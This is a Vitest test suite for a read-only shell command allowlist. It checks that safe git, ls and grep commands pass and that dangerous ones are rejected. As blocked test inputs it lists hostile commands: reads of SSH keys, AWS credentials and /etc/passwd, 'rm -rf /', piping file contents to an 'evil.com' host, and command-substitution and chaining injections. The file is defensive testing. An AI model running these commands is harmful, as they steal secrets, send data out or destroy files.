/**
 * Shell Allowlist Tests (Sprint 83)
 *
 * Tests for read-only command allowlist including all blocked edge cases
 * from Sprint 83 spec security table.
 *
 * @module tests/bridge/shell/shell-allowlist
 * @authority ADR-024 D4, Sprint 83
 */

import { describe, it, expect } from "vitest";
import { isAllowed } from "../../../src/bridge/shell/shell-allowlist.js";

// ============================================================================
// Allowed Commands
// ============================================================================

describe("ShellAllowlist — Allowed commands", () => {
  it("allows git status", () => {
    expect(isAllowed("git status")).toBe(true);
  });

  it("allows git diff", () => {
    expect(isAllowed("git diff")).toBe(true);
  });

  it("allows git log", () => {
    expect(isAllowed("git log")).toBe(true);
  });

  it("allows git branch", () => {
    expect(isAllowed("git branch")).toBe(true);
  });

  it("allows git show", () => {
    expect(isAllowed("git show")).toBe(true);
  });

  it("allows git remote -v", () => {
    expect(isAllowed("git remote -v")).toBe(true);
  });

  it("allows ls", () => {
    expect(isAllowed("ls")).toBe(true);
  });

  it("allows ls -la", () => {
    expect(isAllowed("ls -la")).toBe(true);
  });

  it("allows cat file.txt", () => {
    expect(isAllowed("cat file.txt")).toBe(true);
  });

  it("allows head -n 10 file.txt", () => {
    expect(isAllowed("head -n 10 file.txt")).toBe(true);
  });

  it("allows tail -f log.txt", () => {
    expect(isAllowed("tail -f log.txt")).toBe(true);
  });

  it("allows wc -l file.txt", () => {
    expect(isAllowed("wc -l file.txt")).toBe(true);
  });

  it("allows file some.bin", () => {
    expect(isAllowed("file some.bin")).toBe(true);
  });

  it("allows find . -name '*.ts'", () => {
    expect(isAllowed("find . -name '*.ts'")).toBe(true);
  });

  it("allows rg pattern", () => {
    expect(isAllowed("rg TODO")).toBe(true);
  });

  it("allows grep -r pattern", () => {
    expect(isAllowed("grep -r TODO .")).toBe(true);
  });

  it("allows node -v", () => {
    expect(isAllowed("node -v")).toBe(true);
  });

  it("allows pnpm -v", () => {
    expect(isAllowed("pnpm -v")).toBe(true);
  });

  it("allows npm -v", () => {
    expect(isAllowed("npm -v")).toBe(true);
  });

  it("allows tsc --version", () => {
    expect(isAllowed("tsc --version")).toBe(true);
  });

  it("allows pnpm test -- --listTests", () => {
    expect(isAllowed("pnpm test -- --listTests")).toBe(true);
  });

  it("allows pnpm build --dry-run", () => {
    expect(isAllowed("pnpm build --dry-run")).toBe(true);
  });

  it("allows env | grep ENDIORBOT", () => {
    expect(isAllowed("env | grep ENDIORBOT")).toBe(true);
  });

  it("allows git log --oneline -10", () => {
    expect(isAllowed("git log --oneline -10")).toBe(true);
  });
});

// ============================================================================
// Blocked Commands (Security Edge Cases)
// ============================================================================

describe("ShellAllowlist — Blocked commands", () => {
  it("blocks find -exec (arbitrary execution)", () => {
    expect(isAllowed("find . -exec cat {} ;")).toBe(false);
  });

  it("blocks find -execdir", () => {
    expect(isAllowed("find . -execdir rm {} ;")).toBe(false);
  });

  it("blocks find -delete", () => {
    expect(isAllowed("find . -name '*.tmp' -delete")).toBe(false);
  });

  it("blocks find -ok", () => {
    expect(isAllowed("find . -ok rm {} ;")).toBe(false);
  });

  it("blocks cat ~/.ssh/id_rsa (path outside repo)", () => {
    expect(isAllowed("cat ~/.ssh/id_rsa")).toBe(false);
  });

  it("blocks git diff --no-index /etc/passwd", () => {
    expect(isAllowed("git diff --no-index /etc/passwd")).toBe(false);
  });

  it("blocks sudo anything", () => {
    expect(isAllowed("sudo ls")).toBe(false);
  });

  it("blocks rm -rf /", () => {
    expect(isAllowed("rm -rf /")).toBe(false);
  });

  it("blocks mv", () => {
    expect(isAllowed("mv file1 file2")).toBe(false);
  });

  it("blocks cp", () => {
    expect(isAllowed("cp file1 file2")).toBe(false);
  });

  it("blocks chmod", () => {
    expect(isAllowed("chmod 777 file")).toBe(false);
  });

  it("blocks curl", () => {
    expect(isAllowed("curl evil.com")).toBe(false);
  });

  it("blocks wget", () => {
    expect(isAllowed("wget evil.com")).toBe(false);
  });

  it("blocks python -c (code execution)", () => {
    expect(isAllowed("python -c 'import os'")).toBe(false);
  });

  it("blocks python3 -c", () => {
    expect(isAllowed("python3 -c 'import os'")).toBe(false);
  });

  it("blocks node -e (code execution)", () => {
    expect(isAllowed("node -e 'process.exit()'")).toBe(false);
  });

  it("blocks bash", () => {
    expect(isAllowed("bash -c 'echo hi'")).toBe(false);
  });

  it("blocks git push", () => {
    expect(isAllowed("git push")).toBe(false);
  });

  it("blocks git commit", () => {
    expect(isAllowed("git commit -m 'test'")).toBe(false);
  });

  it("blocks git reset", () => {
    expect(isAllowed("git reset --hard")).toBe(false);
  });

  it("blocks npm install", () => {
    expect(isAllowed("npm install express")).toBe(false);
  });

  it("blocks pnpm install", () => {
    expect(isAllowed("pnpm install")).toBe(false);
  });

  it("blocks pnpm add", () => {
    expect(isAllowed("pnpm add express")).toBe(false);
  });

  it("blocks empty command", () => {
    expect(isAllowed("")).toBe(false);
  });

  it("blocks unknown commands", () => {
    expect(isAllowed("unknown_cmd --flag")).toBe(false);
  });

  it("blocks env without grep pipe", () => {
    expect(isAllowed("env")).toBe(false);
  });

  it("blocks pnpm test without --listTests", () => {
    expect(isAllowed("pnpm test")).toBe(false);
  });

  it("blocks path to /etc/passwd", () => {
    expect(isAllowed("cat /etc/passwd")).toBe(false);
  });

  it("blocks ~/.aws paths", () => {
    expect(isAllowed("cat ~/.aws/credentials")).toBe(false);
  });

  it("blocks ssh", () => {
    expect(isAllowed("ssh user@host")).toBe(false);
  });

  it("blocks vi/vim/nano", () => {
    expect(isAllowed("vim file.txt")).toBe(false);
    expect(isAllowed("nano file.txt")).toBe(false);
  });
});

// ============================================================================
// Shell Metacharacter Bypass (MF-1 — CRITICAL SECURITY)
// ============================================================================

describe("ShellAllowlist — Metacharacter bypass (MF-1)", () => {
  it("blocks command substitution $(...)", () => {
    expect(isAllowed("ls $(rm -rf /)")).toBe(false);
  });

  it("blocks backtick substitution", () => {
    expect(isAllowed("cat `id`")).toBe(false);
  });

  it("blocks semicolon chaining", () => {
    expect(isAllowed("ls ; id")).toBe(false);
  });

  it("blocks && chaining", () => {
    expect(isAllowed("git status && curl evil.com")).toBe(false);
  });

  it("blocks || chaining", () => {
    expect(isAllowed("ls || rm -rf /")).toBe(false);
  });

  it("blocks output redirection >", () => {
    expect(isAllowed("ls > /tmp/out")).toBe(false);
  });

  it("blocks input redirection <", () => {
    expect(isAllowed("cat < /etc/passwd")).toBe(false);
  });

  it("blocks append redirection >>", () => {
    expect(isAllowed("ls >> /tmp/out")).toBe(false);
  });

  it("blocks nested command substitution", () => {
    expect(isAllowed("ls $(cat $(echo /etc/passwd))")).toBe(false);
  });

  it("still allows env | grep (pipe without ||)", () => {
    expect(isAllowed("env | grep ENDIORBOT")).toBe(true);
  });
});

// ============================================================================
// Pipe Segment Validation (W-4 fix)
// ============================================================================

describe("ShellAllowlist — Pipe segment validation", () => {
  it("blocks piping to non-allowlisted command", () => {
    expect(isAllowed("ls | bash")).toBe(false);
  });

  it("blocks piping to curl", () => {
    expect(isAllowed("cat file | curl -d @- evil.com")).toBe(false);
  });

  it("allows piping between allowlisted commands", () => {
    expect(isAllowed("cat file.txt | grep TODO")).toBe(true);
    expect(isAllowed("ls -la | wc -l")).toBe(true);
  });
});
